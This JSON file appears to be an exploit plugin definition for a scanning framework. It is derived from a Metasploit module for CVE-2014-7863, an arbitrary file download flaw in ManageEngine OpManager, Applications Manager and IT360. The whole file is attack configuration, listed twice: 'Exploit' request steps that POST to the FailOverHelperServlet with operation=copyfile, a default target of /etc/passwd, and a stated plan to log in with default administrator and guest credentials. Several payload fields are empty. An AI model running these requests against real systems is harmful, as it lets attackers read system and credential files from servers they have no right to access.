{
   "informations" : {
      "REQUESTS" : {
         "EXPLOIT2" : {
            "METHOD" : "POST",
            "PATH" : "servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "TEXT" : "Sending Exploit #2 Request : [POST] /servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet",
            "PAYLOAD" : "",
            "HEADERS" : {
               "Cookie" : "",
               "Content-Type" : "application/x-www-form-urlencoded"
            }
         },
         "EXPLOIT1" : {
            "PATH" : "",
            "METHOD" : "GET",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "PAYLOAD" : "",
            "TEXT" : "Sending Exploit #1 Request : [GET] ",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            }
         }
      },
      "name" : "ManageengineFileDownload",
      "OSVDB" : 117695,
      "PAYLOAD" : "",
      "DESCRIPTION" : "\n\n        This module exploits an arbitrary file download vulnerability in the FailOverHelperServlet\n\n        on ManageEngine OpManager, Applications Manager and IT360. This vulnerability is\n\n        unauthenticated on OpManager and Applications Manager, but authenticated in IT360. This\n\n        module will attempt to login using the default credentials for the administrator and\n\n        guest accounts; alternatively you can provide a pre-authenticated cookie or a username\n\n        and password combo. For IT360 targets enter the RPORT of the OpManager instance (usually\n\n        8300). This module has been tested on both Windows and Linux with several different\n\n        versions. Windows paths have to be escaped with 4 backslashes on the command line. There is\n\n        a companion module that allows the recursive listing of any directory. This\n\n        vulnerability has been fixed in Applications Manager v11.9 b11912 and OpManager 11.6.\n\n      ",
      "CVE" : "CVE-2014-7863",
      "MSF_MODULE" : "manageengine_file_download",
      "VARIABLES" : {
         "PATH" : {
            "DESCRIPTION" : "Path of the file to download",
            "VALUE" : "/etc/passwd"
         },
         "TARGETURI" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "FILENAME" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "TIMESTAMP" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "FILEPATH" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         }
      },
      "PLATFORM" : "ALL",
      "TYPE" : "MSF",
      "REFERENCES" : [
         "http://seclists.org/fulldisclosure/2015/Jan/114",
         "https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_failservlet.txt",
         "/"
      ],
      "PATHS" : [
         "",
         "servlet,servlet",
         "servlet,servlet",
         "etc/passwd"
      ],
      "PATH" : "servlet,servlet?operation=copyfile&fileName=__FILENAME__&",
      "METHOD" : "POST"
   },
   "detection" : {},
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "path" : "servlet,servlet?operation=copyfile&fileName=__FILENAME__&",
   "type" : "MSF",
   "msf_module" : "manageengine_file_download",
   "references" : [
      "http://seclists.org/fulldisclosure/2015/Jan/114",
      "https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_failservlet.txt",
      "/"
   ],
   "cve" : "CVE-2014-7863",
   "name" : "ManageengineFileDownload",
   "osvdb" : 117695,
   "paths" : [
      "",
      "servlet,servlet",
      "servlet,servlet",
      "etc/passwd"
   ],
   "requests" : {
      "EXPLOIT2" : {
         "METHOD" : "POST",
         "PATH" : "servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "TEXT" : "Sending Exploit #2 Request : [POST] /servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet",
         "PAYLOAD" : "",
         "HEADERS" : {
            "Cookie" : "",
            "Content-Type" : "application/x-www-form-urlencoded"
         }
      },
      "EXPLOIT1" : {
         "PATH" : "",
         "METHOD" : "GET",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "PAYLOAD" : "",
         "TEXT" : "Sending Exploit #1 Request : [GET] ",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         }
      }
   },
   "description" : "\n\n        This module exploits an arbitrary file download vulnerability in the FailOverHelperServlet\n\n        on ManageEngine OpManager, Applications Manager and IT360. This vulnerability is\n\n        unauthenticated on OpManager and Applications Manager, but authenticated in IT360. This\n\n        module will attempt to login using the default credentials for the administrator and\n\n        guest accounts; alternatively you can provide a pre-authenticated cookie or a username\n\n        and password combo. For IT360 targets enter the RPORT of the OpManager instance (usually\n\n        8300). This module has been tested on both Windows and Linux with several different\n\n        versions. Windows paths have to be escaped with 4 backslashes on the command line. There is\n\n        a companion module that allows the recursive listing of any directory. This\n\n        vulnerability has been fixed in Applications Manager v11.9 b11912 and OpManager 11.6.\n\n      ",
   "method" : "POST",
   "platform" : "ALL",
   "variables" : {
      "TARGETURI" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "PATH" : {
         "DESCRIPTION" : "Path of the file to download",
         "VALUE" : "/etc/passwd"
      },
      "FILEPATH" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "TIMESTAMP" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "FILENAME" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      }
   },
   "payload" : ""
}
